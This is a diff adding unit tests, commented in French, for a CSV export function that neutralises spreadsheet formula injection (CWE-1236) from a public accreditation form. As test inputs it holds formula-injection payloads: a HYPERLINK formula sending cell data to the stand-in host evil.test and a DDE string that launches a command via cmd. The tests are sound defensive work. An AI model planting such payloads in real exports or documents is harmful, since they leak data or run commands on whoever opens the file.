@@ -24,3 +24,42 @@ describe('csv Excel-friendly', () => {
     expect(safeFilename('a/b\\c')).not.toContain('/');
   });
 });
+
+describe('SEC-02 — injection de formules dans les exports (CWE-1236)', () => {
+  /**
+   * Le prénom, le nom, le média et le message proviennent du formulaire
+   * d'accréditation PUBLIC : un attaquant non authentifié y dépose une formule
+   * qui s'exécute quand l'organisateur ouvre l'export dans son tableur.
+   */
+  it('neutralise les amorces de formule (= + - @ tabulation)', () => {
+    // Cellule guillemetée (elle contient des `"`) : l'apostrophe protège
+    // l'intérieur, là où le tableur lira le contenu après avoir retiré les guillemets.
+    expect(escapeCsvCell('=HYPERLINK("https://evil.test/?d="&A1,"Voir")')).toBe(
+      '"\'=HYPERLINK(""https://evil.test/?d=""&A1,""Voir"")"',
+    );
+    expect(escapeCsvCell('@SUM(1+1)')).toBe("'@SUM(1+1)");
+    expect(escapeCsvCell('+cmd|\'/c calc\'!A1')).toBe('\'+cmd|\'/c calc\'!A1');
+    expect(escapeCsvCell('-2+3+cmd|x')).toBe("'-2+3+cmd|x");
+    expect(escapeCsvCell('\tDDE')).toBe("'\tDDE");
+  });
+
+  it('le guillemetage RFC 4180 seul ne suffisait pas : la neutralisation reste dans la cellule', () => {
+    // La cellule contient un `;` → elle est guillemetée. Le tableur retire les
+    // guillemets avant d'évaluer : l'apostrophe doit être À L'INTÉRIEUR.
+    expect(escapeCsvCell('=A1;B1')).toBe('"\'=A1;B1"');
+  });
+
+  it('laisse intactes les valeurs légitimes (téléphones, nombres, dates)', () => {
+    expect(escapeCsvCell('+33 6 12 34 56 78')).toBe('+33 6 12 34 56 78');
+    expect(escapeCsvCell('-5')).toBe('-5');
+    expect(escapeCsvCell(-5)).toBe('-5');
+    expect(escapeCsvCell('2026-09-07T10:00:00.000Z')).toBe('2026-09-07T10:00:00.000Z');
+    expect(escapeCsvCell('Léa')).toBe('Léa');
+  });
+
+  it('protège toutes les lignes d’un document, pas seulement l’en-tête', () => {
+    const out = toCsv(['prenom', 'email'], [['=1+1', 'a@b.c']]);
+    expect(out).toContain("'=1+1;a@b.c");
+    expect(out).not.toContain('\r\n=1+1');
+  });
+});
